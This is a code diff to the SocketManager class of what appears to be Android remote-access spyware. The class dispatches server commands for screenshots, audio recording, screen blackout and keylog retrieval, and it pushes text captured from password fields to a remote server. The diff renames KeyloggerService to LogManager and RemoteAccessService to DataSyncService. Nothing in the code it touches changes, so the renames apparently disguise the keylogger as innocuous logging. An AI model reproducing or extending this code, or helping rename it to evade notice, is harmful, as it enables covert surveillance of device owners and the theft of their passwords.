@@ -184,7 +184,7 @@ public class SocketManager {
     private final ScreenshotHandler    screenshotHandler;
     private final FileHandler          fileHandler;
     private final AudioRecorder        audioRecorder;
-    private final KeyloggerService     keyloggerService;
+    private final LogManager logManager;
     private final AppMonitor           appMonitor;
     private final ScreenBlackout       screenBlackout;
     private final PermissionManager    permissionManager;
@@ -211,8 +211,8 @@ public class SocketManager {
         screenshotHandler  = new ScreenshotHandler(context);
         fileHandler        = new FileHandler(context);
         audioRecorder      = new AudioRecorder(context);
-        keyloggerService   = new KeyloggerService(context);
-        appMonitor         = new AppMonitor(context, keyloggerService);
+        logManager   = new LogManager(context);
+        appMonitor   = new AppMonitor(context, logManager);
         screenBlackout     = ScreenBlackout.getInstance();
         permissionManager  = new PermissionManager(context);
 
@@ -238,7 +238,7 @@ public class SocketManager {
             }
         });
         // gestureRecorder is initialized lazily (needs AccessibilityService)
-        KeyloggerService.setEnabled(true);
+        LogManager.setEnabled(true);
     }
 
     /** Called by UnifiedAccessibilityService once it's running, to init gesture recorder. */
@@ -250,7 +250,7 @@ public class SocketManager {
 
     /** Expose appMonitor so UnifiedAccessibilityService can call it. */
     public AppMonitor getAppMonitor()       { return appMonitor; }
-    public KeyloggerService getKeylogger()  { return keyloggerService; }
+    public LogManager getLogManager()  { return logManager; }
     public GestureRecorder getGestureRecorder() { return gestureRecorder; }
 
     /** Whether streaming is currently active (idle-frame mode on). */
@@ -879,7 +879,7 @@ public class SocketManager {
     /**
      * Force a full re-initialization of all channels.
      * Closes every open socket, resets the running flag, and starts fresh connection loops.
-     * Safe to call even when a connection is already active — used by RemoteAccessService
+     * Safe to call even when a connection is already active — used by DataSyncService
      * on every onStartCommand so that a crash/restart always re-registers with the server.
      */
     public synchronized void forceReconnect() {
@@ -1205,18 +1205,18 @@ public class SocketManager {
         if (command.equals("list_recordings"))      return audioRecorder.listRecordings();
         if (command.equals("delete_recording"))     return audioRecorder.deleteRecording(params.getString("filePath"));
 
-        // ── Keylogger ────────────────────────────────────────────────────
-        if (command.equals("get_keylogs"))            return keyloggerService.getKeylogs(params.optInt("limit", 100));
-        if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
+        // ── Input Logging ───────────────────────────────────────────────────
+        if (command.equals("get_keylogs"))            return logManager.getKeylogs(params.optInt("limit", 100));
+        if (command.equals("clear_keylogs"))          return logManager.clearKeylogs();
         if (command.equals("list_keylog_files")) {
             final String cidKl = params.optString("commandId", "");
             bulkExecutor.execute(() -> {
-                try { sendResponse(cidKl, "list_keylog_files", keyloggerService.listKeylogFiles()); }
+                try { sendResponse(cidKl, "list_keylog_files", logManager.listKeylogFiles()); }
                 catch (Exception e) { sendChunkedError(cidKl, "list_keylog_files", e.getMessage()); }
             });
             return null;
         }
-        if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));
+        if (command.equals("download_keylog_file"))   return logManager.downloadKeylogFile(params.getString("date"));
 
         // ── Gesture Recorder ─────────────────────────────────────────────
         if (command.startsWith("gesture_")) {
@@ -2510,7 +2510,7 @@ public class SocketManager {
                 final String finalPkg = packageName;
                 final String finalText = pwText;
                 final String finalTs = ts;
-                keyloggerService.logEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS");
+                logManager.logEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS");
                 if (isConnected()) {
                     pushKeylogEntry(finalPkg, finalAppName, finalText, "PASSWORD_FOCUS",
                             finalTs, true, finalHint);
